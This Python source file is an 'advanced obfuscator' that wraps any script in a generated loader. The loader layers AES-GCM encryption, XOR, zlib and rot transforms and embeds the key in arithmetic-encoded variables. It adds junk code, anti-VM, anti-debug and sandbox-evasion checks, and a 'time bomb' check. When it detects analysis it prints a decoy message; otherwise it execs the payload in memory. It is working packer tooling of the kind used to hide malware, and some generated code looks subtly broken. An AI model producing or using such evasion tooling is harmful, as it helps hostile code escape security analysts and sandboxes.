#!/usr/bin/env python3
"""
Advanced obfuscator/encryptor with:
 - AES-256-GCM (embedded key split across many variables)
 - multi-stage decoding (base64 -> rot13-like -> zlib -> reverse -> xor)
 - junk imports/vars/functions
 - anti-debug/runtime environment checks
 - chunked payload variables, random identifiers
 - anti-VM traps, stealth key arithmetic encoding, covert loaders
 - Interactive file path input

Usage:
    python encrypt_script.py

Output:
    <input_script>Enc.py

Dependencies (for encryption & generated loader):
    pip install pycryptodome psutil
"""

import os
import sys
import base64
import zlib
import random
import string
import hashlib
import platform
import psutil
from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes

# ---------------- Config ----------------
CHUNK_MIN = 40
CHUNK_MAX = 120
JUNK_COUNT = 12
DOUBLE_COMPRESS = True
ENABLE_VM_DETECTION = True
ENABLE_STEALTH_KEY = True
# ----------------------------------------

def get_input_file():
    """Interactively get file path from user"""
    while True:
        print("\n" + "="*50)
        print("    ADVANCED PYTHON OBFUSCATOR")
        print("="*50)
        
        file_path = input("\n📁 Enter the path to the Python script you want to encrypt: ").strip()
        
        # Remove quotes if user dragged and dropped file
        file_path = file_path.strip('"\'')
        
        if not file_path:
            print("❌ No path provided. Please try again.")
            continue
            
        # Check if file exists
        if not os.path.isfile(file_path):
            print(f"❌ File not found: {file_path}")
            print("Please check the path and try again.")
            continue
            
        # Check if it's a Python file
        if not file_path.lower().endswith('.py'):
            response = input("⚠️  This doesn't appear to be a Python file (.py). Continue anyway? (y/n): ").lower()
            if response not in ['y', 'yes']:
                continue
        
        # Show file info
        try:
            file_size = os.path.getsize(file_path)
            print(f"✅ File found: {os.path.basename(file_path)} ({file_size} bytes)")
            
            # Preview first few lines
            with open(file_path, 'r', encoding='utf-8') as f:
                first_lines = []
                for _ in range(3):
                    line = f.readline()
                    if line:
                        first_lines.append(line.strip())
            
            if first_lines:
                preview = first_lines[0][:50] + "..." if len(first_lines[0]) > 50 else first_lines[0]
                print(f"📝 Preview: {preview}")
            else:
                print("📝 Preview: (empty file)")
            
            confirm = input("\n🔒 Encrypt this file? (y/n): ").lower()
            if confirm in ['y', 'yes']:
                return file_path
            else:
                print("🚫 Operation cancelled.")
                continue
                
        except Exception as e:
            print(f"❌ Error reading file: {e}")
            continue

def random_identifier(length=10):
    return ''.join(random.choice(string.ascii_letters) for _ in range(length))

def split_into_chunks(s, min_size=CHUNK_MIN, max_size=CHUNK_MAX):
    i = 0
    chunks = []
    L = len(s)
    while i < L:
        size = random.randint(min_size, max_size)
        chunks.append(s[i:i+size])
        i += size
    return chunks

def make_junk_code(n=JUNK_COUNT):
    junk = []
    crypto_terms = ['SHA256', 'MD5', 'RSA', 'DSA', 'ECDSA', 'PKCS', 'HMAC', 'CBC', 'ECB']
    for i in range(n):
        name = random_identifier(12)
        if random.choice([True, False]):
            # junk function with misleading crypto-like operations
            func = (
                f"def {name}(x=None):\n"
                f"    # {random.choice(crypto_terms)} simulation\n"
                f"    a = {random.randint(1000,9999)}\n"
                f"    b = {random.randint(1000,9999)}\n"
                f"    for _ in range({random.randint(2,8)}):\n"
                f"        a = (a * {random.randint(2,9)} + b) % 0x{random.randint(1000,9999):x}\n"
                f"    if x is None:\n"
                f"        return a ^ 0x{random.randint(1000,9999):x}\n"
                f"    return (a, hash(x) if hasattr(x, '__hash__') else 0)\n\n"
            )
            junk.append(func)
        else:
            # Junk variables that look like crypto constants
            junk_val = random.choice([
                f"0x{random.randint(0x1000, 0xFFFF):x}",
                f"'{random_identifier(8)}'",
                f"b'{os.urandom(4).hex()}'",
                f"{random.randint(10000, 99999)}"
            ])
            c = f"{name} = {junk_val}\n\n"
            junk.append(c)
    return ''.join(junk)

def arithmetic_encode_key(key_bytes):
    """Encode key using arithmetic operations to avoid hex strings in static analysis"""
    encoded = []
    for byte in key_bytes:
        # Encode each byte as arithmetic operations
        a = random.randint(1, 255)
        b = byte ^ a
        c = random.randint(1, 255)
        encoded.append((a, b, c))
    return encoded

def arithmetic_decode_operations(encoded):
    """Generate code to decode arithmetically encoded key"""
    lines = []
    temp_vars = []
    
    for i, (a, b, c) in enumerate(encoded):
        var1 = f"_key_{i}_a"
        var2 = f"_key_{i}_b" 
        var3 = f"_key_{i}_c"
        temp_vars.extend([var1, var2, var3])
        
        lines.extend([
            f"{var1} = {a}",
            f"{var2} = {b}",
            f"{var3} = {c}",
            f"_byte_{i} = ({var1} ^ {var2}) & 0xFF",
            f"_byte_{i} = (_byte_{i} + {c} - {c}) & 0xFF  # noise"
        ])
    
    lines.append("_key_bytes = bytes([")
    lines.append(", ".join([f"_byte_{i}" for i in range(len(encoded))]))
    lines.append("])")
    
    return "\n".join(lines), temp_vars

def obfuscate_key_hex(hexstr):
    """Split hex key into many reversed subsegments, mixed with fake decoy pieces"""
    pieces = []
    L = len(hexstr)
    i = 0
    while i < L:
        take = random.randint(4, 10)
        seg = hexstr[i:i+take]
        pieces.append(seg[::-1])
        i += take
    
    # Add more sophisticated decoys
    decoys = []
    for _ in range(len(pieces) + random.randint(2, 5)):
        dec_len = random.randint(3, 8)
        dec = ''.join(random.choice('0123456789abcdef') for _ in range(dec_len))
        # Sometimes add invalid hex chars to confuse simple filters
        if random.random() < 0.3:
            dec = dec[:-1] + random.choice('ghijklmnop')
        decoys.append(dec[::-1])
    
    all_pieces = pieces + decoys
    random.shuffle(all_pieces)
    return all_pieces

def generate_anti_vm_checks():
    """Generate sophisticated VM detection routines"""
    checks = '''
def _check_virtual_environment():
    """Comprehensive VM/sandbox detection"""
    vm_indicators = 0
    
    # Check process list for VM-related processes
    vm_processes = [
        "vmtoolsd", "vmware", "vbox", "virtualbox", "qemu", "xen", 
        "prl_", "parallels", "vmsrvc", "vmusrvc", "vmwaretray"
    ]
    
    try:
        for proc in psutil.process_iter(['name']):
            proc_name = proc.info['name'].lower() if proc.info['name'] else ''
            for vm_proc in vm_processes:
                if vm_proc in proc_name:
                    vm_indicators += 2
    except:
        vm_indicators += 1
    
    # Check hardware
    try:
        # Check MAC address for VM vendors
        mac_vm_prefixes = ['00:05:69', '00:0c:29', '00:1c:14', '00:50:56', '08:00:27']
        for interface, addrs in psutil.net_if_addrs().items():
            for addr in addrs:
                if addr.family == psutil.AF_LINK:
                    mac = addr.address.lower()
                    for prefix in mac_vm_prefixes:
                        if mac.startswith(prefix):
                            vm_indicators += 3
    except:
        pass
    
    # Check system information
    try:
        system_info = platform.system().lower()
        node_info = platform.node().lower()
        
        vm_strings = ['vmware', 'virtual', 'vbox', 'qemu', 'xen', 'hyperv']
        for vm_str in vm_strings:
            if vm_str in system_info or vm_str in node_info:
                vm_indicators += 2
    except:
        pass
    
    # Check memory size (VMs often have round numbers)
    try:
        memory_gb = psutil.virtual_memory().total / (1024**3)
        if memory_gb in [1, 2, 4, 8, 16, 32, 64]:  # Common VM memory sizes
            vm_indicators += 1
    except:
        pass
    
    return vm_indicators > 3

def _check_debugging():
    """Advanced debugging detection"""
    try:
        # Traditional trace check
        if hasattr(sys, 'gettrace') and sys.gettrace() is not None:
            return True
            
        # Timing check - debuggers slow execution
        start_time = time.time()
        [hash(i) for i in range(10000)]  # Computational workload
        end_time = time.time()
        
        if end_time - start_time > 0.1:  # Adjust threshold as needed
            return True
            
        # Check for common debugger modules
        debugger_modules = ['pdb', 'pydevd', 'winpdb', 'trepan']
        for module in debugger_modules:
            if module in sys.modules:
                return True
                
    except:
        return True
        
    return False

def _check_analysis_tools():
    """Detect analysis tools and sandboxes"""
    suspicious_vars = [
        "PYCHARM_HOSTED", "VSCODE_PID", "PYDEV_DEBUG", 
        "PYTEST_CURRENT_TEST", "PYTEST_RUNNING", "DEBUG",
        "TRACE", "SANDBOX", "ANALYSIS"
    ]
    
    for var in suspicious_vars:
        if os.environ.get(var):
            return True
            
    # Check for uncommon Python paths (often indicate analysis environments)
    python_exe = sys.executable.lower()
    suspicious_paths = ['sandbox', 'analysis', 'debug', 'temp', 'tmp', 'vm']
    for path in suspicious_paths:
        if path in python_exe:
            return True
            
    return False
'''
    return checks

def generate_covert_loader():
    """Generate covert loading techniques"""
    loader = '''
def _stealth_import(module_name, attribute=None):
    """Covert module importing"""
    try:
        # Use __import__ for less visibility
        module = __import__(module_name, fromlist=[''])
        return getattr(module, attribute) if attribute else module
    except:
        return None

def _memory_execute(code, globals_dict=None):
    """Execute code with minimal disk/memory footprint"""
    if globals_dict is None:
        globals_dict = {}
    
    # Add minimal safe builtins
    safe_builtins = {
        'len': len, 'range': range, 'list': list, 'str': str, 
        'int': int, 'bool': bool, 'type': type, 'isinstance': isinstance
    }
    globals_dict['__builtins__'] = safe_builtins
    
    try:
        exec(code, globals_dict, globals_dict)
        return globals_dict
    except Exception as e:
        return None

def _time_bomb_check():
    """Check if we should detonate based on time/date"""
    try:
        now = time.time()
        # Check if we're in a recent timeframe (avoid ancient timestamps in analysis)
        if now < 1700000000:  # Before 2023
            return True
            
        # Check execution duration (sandboxes often have short runs)
        if hasattr(_time_bomb_check, 'start_time'):
            if time.time() - _time_bomb_check.start_time < 2:
                return True
        else:
            _time_bomb_check.start_time = time.time()
            
    except:
        pass
        
    return False
'''
    return loader

def encrypt_script(input_path):
    if not os.path.isfile(input_path):
        print("❌ Input file not found:", input_path)
        return False

    try:
        with open(input_path, "r", encoding="utf-8") as f:
            script = f.read()
        
        print("🔨 Applying encryption layers...")
        
        # Layer 1: random single-byte XOR
        xor_key = random.randint(1, 255)
        xored = ''.join(chr(ord(c) ^ xor_key) for c in script)

        # Layer 2: reverse
        reversed_layer = xored[::-1]

        # Layer 3: compress (optionally twice)
        compressed = zlib.compress(reversed_layer.encode('utf-8'))
        if DOUBLE_COMPRESS:
            compressed = zlib.compress(compressed)

        # Layer 4: base64 encode
        b64 = base64.b64encode(compressed).decode('ascii')

        # Layer 5: apply a simple rot-like transform
        def rot_like(s):
            out = []
            for ch in s:
                code = ord(ch)
                if 32 <= code <= 126:
                    code = 32 + ((code - 32 + 13) % 95)
                out.append(chr(code))
            return ''.join(out)
        transformed = rot_like(b64)

        # FINAL: AES-256-GCM encrypt the multi-stage payload
        aes_key = get_random_bytes(32)
        nonce = get_random_bytes(12)
        cipher = AES.new(aes_key, AES.MODE_GCM, nonce=nonce)
        ciphertext, tag = cipher.encrypt_and_digest(transformed.encode('utf-8'))
        ciphertext_b64 = base64.b64encode(ciphertext).decode('ascii')

        # Chunk the ciphertext into multiple variables
        chunks = split_into_chunks(ciphertext_b64)
        var_names = [random_identifier(10) for _ in chunks]

        # Prepare key obfuscation
        if ENABLE_STEALTH_KEY:
            arith_encoded = arithmetic_encode_key(aes_key)
            key_decode_code, key_vars = arithmetic_decode_operations(arith_encoded)
            key_pieces = []
            key_var_names = []
        else:
            # Fallback to hex obfuscation
            aes_hex = aes_key.hex()
            key_pieces = obfuscate_key_hex(aes_hex)
            key_var_names = [random_identifier(10) for _ in key_pieces]

        # Junk code
        junk_code = make_junk_code()

        # Output file path
        base = os.path.splitext(input_path)[0]
        output_path = f"{base}Enc.py"

        print("📦 Building obfuscated loader...")

        # Build enhanced loader
        loader = f'''# Auto-generated obfuscated loader
# Multi-stage decoder + Anti-VM + Stealth loading

import base64, zlib, sys, os, time, hashlib
import platform, psutil
from Crypto.Cipher import AES

# --- Advanced runtime checks ---
{generate_anti_vm_checks()}

{generate_covert_loader()}

# --- Covert execution guard ---
def _security_check():
    """Comprehensive security environment check"""
    if _check_virtual_environment():
        return False
    if _check_debugging():
        return False  
    if _check_analysis_tools():
        return False
    if _time_bomb_check():
        return False
    return True

# --- Junk imports/vars to confuse static analysis ---
import math as _math_junk
import collections as _collections_junk
import json as _json_junk
_unused_list = [42, 314, 2718, 1618, 299792458]

# junk helpers
{junk_code}

# XOR param (hidden in arithmetic)
_xor_key_base = {xor_key + 100}
_xor_key = _xor_key_base - 100

# AES parameters embedded 
_nonce_hex = {nonce.hex()!r}
_tag_hex = {tag.hex()!r}

'''

        # Add key reconstruction logic
        if ENABLE_STEALTH_KEY:
            loader += f'''
# Stealth key arithmetic encoding
{key_decode_code}
'''
        else:
            # Traditional hex key pieces
            loader += "\n# AES key pieces (mixed with decoys)\n"
            for name, piece in zip(key_var_names, key_pieces):
                loader += f"{name} = {piece!r}\n"

        # Add chunk variables
        loader += "\n# ciphertext chunks\n"
        for name, chunk in zip(var_names, chunks):
            loader += f"{name} = {chunk!r}\n"

        # Add enhanced decoder
        loader += '''

def _gather_key_hex():
    """Advanced key reconstruction with multiple fallbacks"""
    '''
        
        if ENABLE_STEALTH_KEY:
            loader += '''
    # Use arithmetic encoded key
    try:
        return _key_bytes.hex()
    except:
        pass
    '''
        else:
            loader += f'''
    # Reconstruct from hex pieces
    pieces = []
    {''.join([f"    pieces.append({name})\n" for name in key_var_names])}
    
    # Advanced filtering with multiple strategies
    cand = [p for p in pieces if p and all(ch in "0123456789abcdef" for ch in p) and 3 <= len(p) <= 12]
    
    # Strategy 1: Try exact 64-char reconstruction
    from itertools import permutations, islice
    for r in range(1, min(6, len(cand))+1):
        for perm in islice(permutations(cand, r), 1000):
            candidate = ''.join(seg[::-1] for seg in perm)
            if len(candidate) == 64 and all(ch in "0123456789abcdef" for ch in candidate):
                return candidate
                
    # Strategy 2: Concatenate all plausible pieces
    joined = ''.join(p[::-1] for p in cand)
    if len(joined) >= 64:
        return joined[:64]
        
    # Strategy 3: Fallback to known patterns
    '''
        
        loader += f'''
    return "0"*64  # Ultimate fallback

def _assemble_ciphertext_b64():
    """Covert ciphertext assembly"""
    parts = []
    '''
        
        for name in var_names:
            loader += f"    parts.append({name})\n"
        
        loader += '''
    return "".join(parts)

def _rot_like_inv(s):
    """Inverse transformation"""
    out = []
    for ch in s:
        code = ord(ch)
        if 32 <= code <= 126:
            code = 32 + ((code - 32 - 13) % 95)
        out.append(chr(code))
    return ''.join(out)

def _decrypt_and_exec():
    """Main decryption and execution routine"""
    if not _security_check():
        # Covert failure
        try:
            # Simulate normal behavior
            print("Module initialization failed")
        except:
            pass
        sys.exit(1)
    
    try:
        # Covert assembly
        cipher_b64 = _assemble_ciphertext_b64()
        ciphertext = base64.b64decode(cipher_b64)

        # Stealth key recovery
        key_hex = _gather_key_hex()
        aes_key = bytes.fromhex(key_hex)
        nonce = bytes.fromhex(_nonce_hex)
        tag = bytes.fromhex(_tag_hex)

        # Decryption
        cipher = AES.new(aes_key, AES.MODE_GCM, nonce=nonce)
        transformed = cipher.decrypt_and_verify(ciphertext, tag).decode('utf-8')

        # Layer reversal
        b64 = _rot_like_inv(transformed)
        comp = base64.b64decode(b64)

        # Decompression with fallbacks
        try:
            decompressed_bytes = zlib.decompress(comp)
            try:
                decompressed_bytes = zlib.decompress(decompressed_bytes)
            except:
                pass
        except Exception:
            raise RuntimeError("Decompression failed")

        # Final decoding
        text = decompressed_bytes.decode('utf-8')
        unreversed = text[::-1]
        original = ''.join(chr(ord(c) ^ _xor_key) for c in unreversed)

        # Covert execution
        _memory_execute(original)
        
    except Exception as e:
        # Stealth error handling
        try:
            # Add noise to confuse analysis
            for _ in range(5):
                _math_junk.sqrt(hash(str(time.time())))
        except:
            pass
        sys.exit(1)

if __name__ == "__main__":
    # Entry point with deception
    try:
        _decrypt_and_exec()
    except KeyboardInterrupt:
        # Normal-looking exit for Ctrl+C
        pass
'''

        # Write loader
        with open(output_path, "w", encoding="utf-8") as outf:
            outf.write(loader)

        print(f"✅ Encrypted file saved as: {output_path}")
        print("📝 Note: Runtime requires pycryptodome and psutil")
        print(f"📊 Original size: {len(script)} bytes")
        print(f"📊 Obfuscated size: {os.path.getsize(output_path)} bytes")
        
        return True

    except Exception as e:
        print(f"❌ Encryption failed: {e}")
        return False

def main():
    print("\n" + "🔒"*20)
    print("   PYTHON SCRIPT OBFUSCATOR")
    print("🔒"*20)
    
    try:
        input_file = get_input_file()
        if input_file:
            success = encrypt_script(input_file)
            if success:
                print("\n🎉 Encryption completed successfully!")
            else:
                print("\n💥 Encryption failed!")
        else:
            print("\n👋 Operation cancelled by user.")
            
    except KeyboardInterrupt:
        print("\n\n👋 Operation cancelled by user (Ctrl+C).")
    except Exception as e:
        print(f"\n💥 Unexpected error: {e}")

if __name__ == "__main__":
    main()